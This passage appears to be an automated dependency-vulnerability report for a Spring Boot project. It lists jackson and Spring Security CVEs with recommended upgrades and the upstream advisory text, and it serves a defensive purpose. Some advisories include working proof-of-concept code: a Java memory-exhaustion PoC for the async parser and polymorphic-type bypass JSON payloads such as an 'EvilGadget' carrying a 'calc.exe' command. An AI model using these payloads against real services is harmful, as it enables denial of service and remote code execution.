- `com.fasterxml.jackson.core:jackson-databind` 2.x: confirmed bypass at 21dd70dd (== released 2.21.4 / 2.22.0 line; includes the #5973 backport). `DEFAULT_VIEW_INCLUSION` default=true.
- `tools.jackson.core:jackson-databind` 3.x: confirmed bypass at HEAD 7a5939d6 (latest 3.x). `DEFAULT_VIEW_INCLUSION` default=false → the stock-config repro is the common shape where privileged inner fields are individually `@JsonView(PublicView)` and the developer relies on the container `@JsonView(AdminView)`; the 3.x PoC mass-assigns role/approved/creditBalance under PublicView. (The other simultaneous report's PoC was reportedly fixed on 3.x; this distinct container-property path is not.)

## Additive variants (runtime-confirmed both branches; all closed by the same one-line guard)
- nested `@JsonUnwrapped` (unwrapped-in-unwrapped) — recursive bypass.
- merge / `readerWithView(...).withValueToUpdate(...)` (PATCH/partial-update) — bypass; non-unwrapped merge control gates correctly.
- builder-based deserializer (`@JsonDeserialize(builder=...)`) — `BuilderBasedDeserializer` routes through the same `processUnwrapped`.
- Honest non-findings: read-side serialization correctly honors views (no leak); `@JsonAnySetter`+view and `@JsonTypeInfo`+`@JsonUnwrapped` are separate/unsupported behaviors, not this bug.

## Fix
Add `prop.visibleInView(ctxt.getActiveView())` (when `MapperFeature.DEFAULT_VIEW_INCLUSION`/active-view applies) to the `processUnwrapped()` property loop, mirroring `processUnwrappedCreatorProperties()`. One change closes the impact PoC + all three variants across `BeanDeserializer` and `BuilderBasedDeserializer`. Full runnable PoCs (2.x + 3.x) + variant harnesses available on request.

### CVE-2026-68494: jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-68494](https://github.com/advisories/GHSA-r7wm-3cxj-wff9): jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-core:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.4

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary

The fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: "ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller".

As a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).

This is the same vulnerability class, same advisory wording ("Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.

## Affected versions

Verified on the patched releases:
- `com.fasterxml.jackson.core:jackson-core` **2.18.6**
- `com.fasterxml.jackson.core:jackson-core` **2.21.1**

Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.

## Affected code

[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.

### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:

```java
if (outPtr >= outBuf.length) {
    // NOTE: must expand to ensure contents all in a single buffer (to keep
    // other parts of parsing simpler)
    outBuf = _textBuffer.expandCurrentSegment();
}
outBuf[outPtr++] = (char) ch;
if (++_inputPtr >= _inputEnd) {
    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
    _textBuffer.setCurrentLength(outPtr);
    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)
}
```

### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:

```java
protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
    int negMod = _numberNegative ? -1 : 0;

    while (true) {
        if (_inputPtr >= _inputEnd) {
            _minorState = MINOR_NUMBER_INTEGER_DIGITS;
            _textBuffer.setCurrentLength(outPtr);
            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)
        }
        int ch = getByteFromBuffer(_inputPtr) & 0xFF;
        if (ch < INT_0) {
            if (ch == INT_PERIOD) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        if (ch > INT_9) {
            if ((ch | 0x20) == INT_e) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        ++_inputPtr;
        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
    }
    _setIntLength(outPtr+negMod);            // <-- validated here
    _textBuffer.setCurrentLength(outPtr);
    return _valueComplete(JsonToken.VALUE_NUMBER_INT);
}
```

The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to the caller without validating the accumulator length.

### Compare with the fraction path that is correct

`_finishFloatFraction` lines 1827-1838:

```java
while (loop) {
    if (ch >= INT_0 && ch <= INT_9) {
        ++fractLen;
        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
        if (_inputPtr >= _inputEnd) {
            _textBuffer.setCurrentLength(outPtr);
            _setFractLength(fractLen);          // <-- VALIDATED
            return JsonToken.NOT_AVAILABLE;
        }
        ch = getNextSignedByteFromBuffer();
    }
    ...
}
```

## Impact

Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.

The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.

CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.

## Proof of concept

Standalone PoC, no Maven required:

```
mkdir poc && cd poc
curl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar
cat > PoC.java <<'EOF'
import com.fasterxml.jackson.core.*;
import com.fasterxml.jackson.core.async.ByteArrayFeeder;

public class PoC {
    public static void main(String[] args) throws Exception {
        StreamReadConstraints strict = StreamReadConstraints.builder()
                .maxNumberLength(1000)
                .build();
        JsonFactory f = new JsonFactoryBuilder()
                .streamReadConstraints(strict)
                .build();

        // Sanity: synchronous parser rejects 5000-digit int.
        try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) + "}")) {
            while (p.nextToken() != null) { /* drive */ }
            System.out.println("[-] BUG ABSENT: sync parser accepted");
            return;
        } catch (Exception e) {
            System.out.println("[+] sync parser rejected 5000-digit int: " + e.getClass().getSimpleName());
        }

        // Bug: async parser, chunked, no terminator.
        JsonParser ap = f.createNonBlockingByteArrayParser();
        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;

        byte[] preamble = "{\"v\":".getBytes("UTF-8");
        feeder.feedInput(preamble, 0, preamble.length);
        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }

        byte[] digits = new byte[16 * 1024];
        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));

        for (int c = 0; c < 600; c++) {
            feeder.feedInput(digits, 0, digits.length);
            JsonToken t = ap.nextToken();
            if (t != JsonToken.NOT_AVAILABLE) {
                System.out.println("[-] unexpected token: " + t);
                return;
            }
        }
        System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000");

        // Closing the number now finally triggers the validator.
        feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
        feeder.endOfInput();
        try {
            while (ap.nextToken() != null) { /* drive */ }
        } catch (Exception e) {
            System.out.println("[*] late rejection on close: " + e.getMessage().split("\n")[0]);
        }
        ap.close();
    }
}
EOF
javac -cp jackson-core-2.18.6.jar PoC.java
java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
```

Observed output against `jackson-core-2.18.6`:

```
[+] sync parser rejected 5000-digit int: StreamConstraintsException
[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000
[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
```

Observed output against `jackson-core-2.21.1`: identical.

The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.

## End-to-end reproduction through real HTTP

Supplements the standalone PoC with a running Spring Boot WebFlux server,
driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
streaming-decode path that production reactive endpoints use.

Setup:
- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)
- jackson-databind 2.17.2, jackson-core overridden:
  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)
  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
- JVM: OpenJDK 17.0.18
- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`

Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one
HTTP chunk per `feedInput` (the same pattern used for any
`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
each (50,000 digits total) at 20ms intervals, then writes the closing `}`.

VULN — jackson-core 2.18.7:
```
[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting
[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
HTTP/1.1 200 OK
ERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
       Number value length (50000) exceeds the maximum allowed (1000, ...)
```
Server-side controller trace (250 DataBuffer arrivals elided):
```
[ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
[ctrl] DataBuffer arrived size=200 ms=42
...
[ctrl] DataBuffer arrived size=199 ms=5993
[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
```
Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
`maxNumberLength=1000` declared. The validator never fires during streaming;
it only fires at value-completion when the closing `}` arrives.

PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
```
[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe
[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream
```
Server-side controller trace:
```
[ctrl] DataBuffer arrived size=6   ms=129
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=145
[ctrl] DataBuffer arrived size=200 ms=146
[ctrl] DataBuffer arrived size=200 ms=147
[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)
```
Patched server raises `StreamConstraintsException` at 155ms after only 5
DataBuffers, exactly when the accumulated digit count crosses
`maxNumberLength=1000`. The connection is reset mid-stream rather than the
parser silently consuming the rest of the attacker's payload.

Side-by-side:

| Build | Chunks accepted before exception | Digits buffered | Time to detection |
|---|---|---|---|
| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |
| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |

Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
distinguish the two builds because Spring's `decodeToMono` joins all
DataBuffers into one before parsing. The exploitable shape is the
streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
which is also what `Jackson2Tokenizer` uses for any streaming JSON
deserialization in WebFlux and Quarkus reactive REST.

## Suggested fix

Mirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:

```diff
     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
         int negMod = _numberNegative ? -1 : 0;

         while (true) {
             if (_inputPtr >= _inputEnd) {
                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                 _textBuffer.setCurrentLength(outPtr);
+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);
                 return _updateTokenToNA();
             }
```

Note: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.

Apply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).

Alternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.

## Credit

Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.

### CVE-2026-59888: jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-59888](https://github.com/advisories/GHSA-3pjw-73gf-8qr5): jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.4

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary
For Java Records, `POJOPropertiesCollector._removeUnwantedIgnorals()` records a `@JsonIgnore`-annotated component under its original implicit name before `_renameUsing()` applies the `PropertyNamingStrategy`. After the rename, `_ignoredPropertyNames` still holds only the pre-rename name, so `_ignorableProps` is built from the stale key. The renamed JSON key passes `IgnorePropertiesUtil.shouldIgnore()` and is assigned to the Record's constructor parameter, defeating the `@JsonIgnore`.

## Impact
A Record using a naming strategy that relies on `@JsonIgnore` to keep an internal/privileged component out of deserialization can have that component set from the wire via its renamed key (e.g. a role/flag controlled by an untrusted client).

## Affected / Patched (verified via `git tag --contains`)
- 2.15-2.18 line: `>= 2.15.0, < 2.18.8` -> fixed in **2.18.8** (backport `c7c6783`)
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4** (#5974, `baa2cdf`)

## Severity / CWE
Maintainer: minor. Reporter: Moderate. CWE-915; related CWE-345.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

### CVE-2026-54515: jackson-databind has case-insensitive deserialization bypasses per-property @JsonIgnoreProperties
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54515](https://github.com/advisories/GHSA-5jmj-h7xm-6q6v): jackson-databind has case-insensitive deserialization bypasses per-property @JsonIgnoreProperties

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.5 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary
In `BeanDeserializerBase.createContextual()`, per-property `@JsonIgnoreProperties` exclusions are applied by `_handleByNameInclusion()`, producing a `contextual` deserializer whose `BeanPropertyMap` has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by `@JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)`) rebuilds from `this._beanProperties` (the original, unfiltered map) instead of `contextual._beanProperties`, then overwrites the filtered map — restoring every property `_handleByNameInclusion` had just removed. The ignored property becomes writable again.

## Impact
An application that both enables case-insensitive matching and relies on per-property `@JsonIgnoreProperties` to keep a field unwritable can have that field set from untrusted JSON (mass-assignment-style write).

## Affected / Patched
Will be fixed in 2.18.9, 2.21.5, 2.22.1 and 3.1.4.

## Severity / CWE
Maintainer: minor. Reporter: Moderate. CWE-915.

## Upstream fix
FasterXML/jackson-databind#5962 (PR #5964, `0e1b0b2`), milestone 3.1.4. Released 2026-06-04.

### CVE-2026-54514: jackson-databind: InetSocketAddress deserialization triggers eager DNS resolution (SSRF)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54514](https://github.com/advisories/GHSA-hgj6-7826-r7m5): jackson-databind: InetSocketAddress deserialization triggers eager DNS resolution (SSRF)

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.4

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary
`JDKFromStringDeserializer` constructed `InetSocketAddress` with `new InetSocketAddress(host, port)`, which performs eager DNS name resolution for hostname inputs at deserialization time. An application that binds untrusted JSON into a type containing an `InetSocketAddress` field issues an attacker-chosen DNS query during `readValue`, before any application-level validation or connect logic. The fix uses `InetSocketAddress.createUnresolved(host, port)`, deferring DNS to an explicit connect.

## Impact
An attacker controlling JSON deserialized into an `InetSocketAddress`-bearing type can force outbound DNS lookups for attacker-chosen hostnames at deserialization time (SSRF / DNS-based out-of-band interaction / internal-resolver probing), purely from binding.

## Affected / Patched (verified via `git tag --contains` on `1f5a103`)
- 2.18 line: `>= 2.18.0, < 2.18.8` -> fixed in **2.18.8**
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**

## Severity / CWE
Maintainer: minor. Reporter: LOW. CWE-918 (SSRF).

## Upstream fix
FasterXML/jackson-databind#5951 ("Improve InetSocketAddress deserialization"). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

### CVE-2026-54513: jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54513](https://github.com/advisories/GHSA-rmj7-2vxq-3g9f): jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.4

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Summary
`BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray()` allowlists any array type based only on `clazz.isArray()`, without validating the array's component (element) type against the configured allowlist. A PTV built with `allowIfSubTypeIsArray()` plus an explicit concrete-type allowlist therefore still permits `EvilType[]` even though `EvilType` is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist.

## Impact
Applications using `BasicPolymorphicTypeValidator` with `allowIfSubTypeIsArray()` as a safeguard get no protection for concrete array component types; an attacker controlling JSON can instantiate non-allowlisted types via an array wrapper, re-opening the gadget-instantiation risk PTV is meant to prevent.

## Affected / Patched (verified via `git tag --contains`)
- 2.18 line: `>= 2.10.0, < 2.18.8` -> fixed in **2.18.8**
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

## Severity / CWE
Maintainer: significant. Reporter: HIGH. CWE-184 (Incomplete List of Disallowed Inputs); related CWE-502.

## Upstream fix
FasterXML/jackson-databind#5981; fix PR #5983 (`24529da`), 2.18 backport PR #5984 (`01d1692`). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

### CVE-2026-54512: jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54512](https://github.com/advisories/GHSA-j3rv-43j4-c7qm): jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, <= 2.21.3

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
`jackson-databind`'s `PolymorphicTypeValidator` (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains `<`), `DatabindContext._resolveAndValidateGeneric()` validates **only the raw container class name** (the substring before `<`) against the configured PTV.

If the container type is approved, the method parses the full canonical type string via `TypeFactory.constructFromCanonical()` and returns the fully parameterized type **without ever validating the nested type arguments** against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization.

An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example `java.util.ArrayList<com.evil.Gadget>` when only `java.util.ArrayList` is allow-listed. The container passes the PTV check; `com.evil.Gadget` is loaded via `Class.forName(name, true, loader)`, instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list.

This is the same vulnerability class responsible for the historical sequence of jackson-databind deserialization CVEs; here it manifests as a validator bypass rather than a missing deny-list entry.


## Impact

- **Bypass of the PTV allow-list**, including the recommended `BasicPolymorphicTypeValidator` configured with name-prefix allow rules.
- **Arbitrary class instantiation** of any type assignable to the container's element/parameter position, with attacker-controlled property values (setter/field injection).
- **Potential unauthenticated remote code execution** when a class with exploitable side effects (JNDI lookup, JDBC/connection-pool gadgets,`TemplatesImpl`-style loaders, etc.) is present on the classpath.

Applications that accept untrusted JSON and rely on a configured PTV — the documented, security-conscious configuration — are affected.


## Proof of Concept

Configuration restricting polymorphic deserialization to a single safe container:

```java
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("java.util.ArrayList")
        .build();

ObjectMapper mapper = JsonMapper.builder()
        .polymorphicTypeValidator(ptv)
        .build();
```

Malicious payload (`Wrapper.value` is `Object` with `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)`):

```json
{"value":["java.util.ArrayList<com.evil.EvilGadget>",[{"cmd":"calc.exe"}]]}
```

On vulnerable versions, `com.evil.EvilGadget` is instantiated and its `cmd` property is set, despite only `java.util.ArrayList` being allow-listed. On `2.18.8` / `2.21.4` / `3.1.4` the deserialization throws `InvalidTypeIdException` before instantiation.

**Variant payloads** (all bypass an `ArrayList`/`HashMap` allow-list):

| Type ID | Smuggled type position |
|---|---|
| `java.util.ArrayList<Evil>` | list element |
| `java.util.HashMap<Evil,String>` | map key |
| `java.util.HashMap<String,Evil>` | map value |
| `java.util.ArrayList<java.util.ArrayList<Evil>>` | nested element |
| `java.util.ArrayList<Evil[]>` | array element |

---

## Patches

Fixed in **2.18.8**, **2.21.4** and **3.1.4** via the changes for [FasterXML/jackson-databind#5988](https://github.com/FasterXML/jackson-databind/issues/5988), commit `434d6c511`. The fix adds recursive validation of each non-trivial type parameter (and array element types appearing as parameters) through the full PTV chain, with documented exemptions for `Object` (wildcard resolution) and `Enum` types.

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

### CVE-2026-47838: Spring Security Vulnerable to Unauthorized User Impersonation when Using X.509 Client Certificates
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2026-47838](https://github.com/advisories/GHSA-293q-567p-wmwq): Spring Security Vulnerable to Unauthorized User Impersonation when Using X.509 Client Certificates

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.security:spring-security-web:6.5.0 (compile; via spring-boot-starter-security at pom.xml:65); affected range >= 6.5.0, <= 6.5.10

Recommended fix:
  - org.springframework.security:spring-security-web: upgrade to 6.5.11 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
In Spring Security Web, `SubjectDnX509PrincipalExtractor` does not correctly handle certain malformed X.509 certificate CN values, which can lead to reading the wrong value for the username. In a carefully crafted certificate, this can lead to an attacker impersonating another user.

`SubjectDnX509PrincipalExtractor` is deprecated by this CVE and replaced with `SubjectX500PrincipalExtractor`. As part of updating, you should also migrate to `SubjectX500PrincipalExtractor`.

Affected versions:
Spring Security Enterprise 5.7.0 through 5.7.24; 5.8.0 through 5.8.26; 6.3.0 through 6.3.17; 6.4.0 through 6.4.17; 6.5.0 through 6.5.10. 
OSS 6.5.0 through 6.5.10.

### CVE-2026-41706: Spring Security: Open Redirect via Unvalidated Post-Login Redirect URL Stored in CookieRequestCache
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2026-41706](https://github.com/advisories/GHSA-x2r2-rvhq-2mqv): Spring Security: Open Redirect via Unvalidated Post-Login Redirect URL Stored in CookieRequestCache

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.security:spring-security-web:6.5.0 (compile; via spring-boot-starter-security at pom.xml:65); affected range >= 6.5.0, <= 6.5.10

Recommended fix:
  - org.springframework.security:spring-security-web: upgrade to 6.5.11 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring Security's CookieRequestCache and CookieServerRequestCache store the pre-authentication request URL in a browser cookie so that users can be redirected back to their intended destination after a successful login. In affected versions, the full absolute URL is stored in the cookie and is used without validation as the post-login redirect target.

Affected versions:
Spring Security 5.7.0 through 5.7.23; 5.8.0 through 5.8.25; 6.3.0 through 6.3.16; 6.4.0 through 6.4.16; 6.5.0 through 6.5.10; 7.0.0 through 7.0.5.

### CVE-2026-22732: Spring Security HTTP Headers Are not Written Under Some Conditions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2026-22732](https://github.com/advisories/GHSA-mf92-479x-3373): Spring Security HTTP Headers Are not Written Under Some Conditions

Severity: CRITICAL

Affected resolved dependencies:
  - org.springframework.security:spring-security-web:6.5.0 (compile; via spring-boot-starter-security at pom.xml:65); affected range >= 6.5.0, < 6.5.9

Recommended fix:
  - org.springframework.security:spring-security-web: upgrade to 6.5.9 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
When applications specify HTTP response headers for servlet applications using Spring Security, there is the possibility that the HTTP Headers will not be written. 
